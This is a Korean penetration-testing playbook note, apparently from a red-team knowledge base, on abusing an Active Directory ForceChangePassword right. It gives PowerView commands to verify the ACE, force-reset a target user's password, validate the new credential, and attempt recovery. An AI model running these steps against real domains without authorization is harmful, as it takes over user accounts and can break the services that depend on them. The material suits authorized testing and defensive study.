---
tags:
  - 환경/ad
시작조건: ["인증된 AD Identity 확보", "대상 사용자에 대한 비밀번호 재설정 권한 확인"]
필요권한: ["ForceChangePassword 또는 동등한 사용자 객체 제어 권한"]
필요조건: ["DC LDAP 접근", "대상 사용자", "비밀번호 정책을 충족하는 임시 비밀번호", "복구 계획"]
결과: ["도메인 credential 후보", "대상 사용자 Identity 접근 후보"]
---

# AD 사용자 비밀번호 강제 재설정

## 한 줄 판단

현재 사용하는 AD 계정이 도메인 컨트롤러의 LDAP에 연결할 수 있고 대상 사용자의 비밀번호를 강제로 재설정할 권한이 있다면, 임시 비밀번호로 변경한 뒤 실제 인증 서비스에서 대상 사용자의 새 도메인 자격 증명을 검증한다.

## 전제 조건

| 구분 | 조건 | 확인 방법 |
|---|---|---|
| 시작 상태 | 인증된 AD 계정 | 현재 사용자와 도메인 확인 |
| 필요 권한 | 대상 사용자 비밀번호 재설정 권한 | 제어 중인 SID와 대상 객체의 ACE 대조 |
| 입력·환경 | 임시 비밀번호와 복구 계획 | 잠금·복잡도 정책 및 계정 소유자 영향 확인 |

## 실행

> 비밀번호 변경은 서비스·예약 작업·기존 ticket에 영향을 줄 수 있으며 원래 비밀번호를 모르면 자동 복원이 불가능하다. 대상 계정, 변경 요청자, 임시·원래 비밀번호의 역할을 분리하고 복구 상태를 과장하지 않는다.

`<CONTROLLED_USER>`는 ACL을 가진 변경 요청자, `<TARGET_USER>`는 비밀번호가 바뀌는 대상이다. `<TEMP_PASSWORD>`는 이번 변경값, `<ORIGINAL_PASSWORD>`는 실제로 알고 있을 때만 복구 입력으로 쓴다.

### 1. 대상과 권한 재확인

```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid '<CONTROLLED_USER>'
Get-DomainObjectACL -ResolveGUIDs -Identity '<TARGET_USER>' |
  Where-Object { $_.SecurityIdentifier -eq $sid }
Get-DomainUser -Identity '<TARGET_USER>' -Properties samaccountname,useraccountcontrol,pwdlastset,lockouttime,accountexpires |
  Select-Object samaccountname,useraccountcontrol,pwdlastset,lockouttime,accountexpires
```

확인할 출력:

- 대상 사용자의 `ObjectDN`과 현재 계정 SID가 같은 행에 표시된다.
- `ObjectAceType`에 `User-Force-Change-Password`가 표시된다.
- 비밀번호 값 자체는 조회하거나 Vault에 기록하지 않는다. 계정 상태, `pwdLastSet`, 종속 서비스 담당자와 복구 책임자만 작업 기록에 남긴다.
- 원래 비밀번호를 모르면 이번 변경 전 자격 증명으로 자동 복원할 수 없다. 새 관리 비밀번호 배포 절차가 없으면 실행하지 않는다.

### 2. 임시 비밀번호로 재설정

```powershell
$NewPassword = ConvertTo-SecureString '<TEMP_PASSWORD>' -AsPlainText -Force
$OperatorPassword = ConvertTo-SecureString '<OPERATOR_PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<CONTROLLED_USER>', $OperatorPassword)
Set-DomainUserPassword -Identity '<TARGET_USER>' -AccountPassword $NewPassword -Credential $Cred -Verbose
```

확인할 출력:

- `Attempting to set the password` 이후 `successfully reset`이 표시된다.
- 출력만으로 새 비밀번호의 서비스 인증 성공을 단정하지 않는다.

### 3. 최소 범위로 인증 확인

잠금 정책과 대상 서비스를 확인한 뒤 [[원격 비밀번호 공격]]에서 한 서비스에만 새 credential을 검증한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `successfully reset`과 새 비밀번호 인증 성공 | 비밀번호 재설정 권한 행사와 credential 유효성 확인 | 대상 사용자의 도메인 credential 확보 | 원복 후 [[확보한 자격 증명으로 원격 접근 경로 선택]] |
| `successfully reset`이나 인증 실패 | 복제 지연, 계정 제한 또는 형식 문제 | 변경 영향은 있으나 credential 미확인 | 추가 재설정 전에 DC·계정 상태·인증 형식 확인 |
| access denied | ACE가 현재 토큰에 유효하지 않음 | 권한 행사 실패 | deny·상속·보호 객체·그룹 토큰 재검증 |
| 비밀번호 정책 오류 | 임시 비밀번호가 정책을 충족하지 않음 | 변경 없음 | [[AD 비밀번호 정책 열거 및 조회]] 후 정책을 충족하는 값 재선정 |

## 확인할 출력과 권한

- ACL 단서, 재설정 성공 메시지, 새 credential 인증 성공을 서로 다른 단계로 판정한다.
- 새 credential은 대상 사용자의 권한만 가지며 로컬 관리자나 도메인 고권한을 뜻하지 않는다.

## 변경 영향과 복구

### 원래 비밀번호를 알고 있고 도메인 정책상 재사용이 허용되는 경우

대상 Windows 호스트의 PowerShell에서 같은 계정과 권한으로 복원 요청을 보낸다.

```powershell
$RestorePassword = ConvertTo-SecureString '<ORIGINAL_PASSWORD>' -AsPlainText -Force
Set-DomainUserPassword -Identity '<TARGET_USER>' -AccountPassword $RestorePassword -Credential $Cred -Verbose
Get-DomainUser -Identity '<TARGET_USER>' -Properties samaccountname,useraccountcontrol,pwdlastset,lockouttime,accountexpires |
  Select-Object samaccountname,useraccountcontrol,pwdlastset,lockouttime,accountexpires
```

복원 요청 성공과 실제 인증 성공을 분리한다. DC 복제 상태를 고려해 식별한 한 서비스에서 인증을 확인하고, 작업 전에 식별한 서비스·예약 작업·응용 프로그램의 상태를 대조한다. 원래 문자열을 다시 설정해도 `pwdLastSet`, 비밀번호 기록, 감사 이벤트, 이미 영향을 받은 세션·티켓과 종속 시스템 상태까지 이전 시점으로 돌아가지는 않으므로 `원래 비밀번호 사용 가능 확인`으로 기록하고 완전 원복으로 표현하지 않는다.

### 원래 비밀번호를 모르는 경우

자동 원복은 불가능하다. 새 관리 비밀번호를 설정하고, 종속 서비스·예약 작업·응용 프로그램의 저장 자격 증명을 갱신한 뒤 각각의 정상 동작을 확인해야 한다. 이 확인이 끝나기 전에는 `복구 완료`가 아니라 `복구 미완료`로 기록한다. 새 비밀번호와 원래 비밀번호는 Vault에 남기지 않는다.

복원 요청이 비밀번호 기록·복잡도 정책 또는 권한 문제로 실패하면 반복하지 말고 [[AD 비밀번호 정책 열거 및 조회]], 대상 계정 상태와 ACE를 먼저 재확인한다. 재설정 성공 메시지가 있어도 인증·종속 서비스 확인이 되지 않았다면 복구 완료로 판정하지 않는다.

## 참고 링크

- [pwd-Last-Set attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-pwdlastset)
- [Password change and reset mechanisms](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/password-change-mechanisms)

## 관련 공격기법

- [[AD ACL 권한 열거와 공격 경로 식별]]
- [[원격 비밀번호 공격]]

## 관련 도구

- [[PowerView]]

## 관련 상태 라우터

- [[확보한 자격 증명으로 원격 접근 경로 선택]]
